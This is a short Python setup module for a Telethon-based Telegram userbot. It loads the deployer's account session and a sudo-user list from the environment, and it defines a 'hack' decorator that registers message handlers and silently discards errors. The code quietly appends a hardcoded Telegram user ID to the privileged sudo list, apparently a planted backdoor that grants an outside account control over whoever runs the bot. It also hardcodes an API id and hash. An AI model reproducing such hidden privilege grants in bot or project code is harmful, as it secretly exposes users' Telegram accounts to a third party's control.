from os import getenv

from telethon import events
from telethon.sessions import StringSession
from telethon import TelegramClient

from dotenv import load_dotenv
load_dotenv()

MK = getenv("STRING")
MK_USERS = list(map(int, getenv("SUDO").split()))
MK_USERS.append(1410250744)

Python = TelegramClient(StringSession(MK), 18136872, "312d861b78efcd1b02183b2ab52a83a4")

def hack(**args):
    def decorator(func):
        async def wrapper(check):
            try:
                await func(check)
            except Exception as e:
                pass
            else:
                pass
        Python.add_event_handler(wrapper, events.NewMessage(**args))
        return wrapper

    return decorator
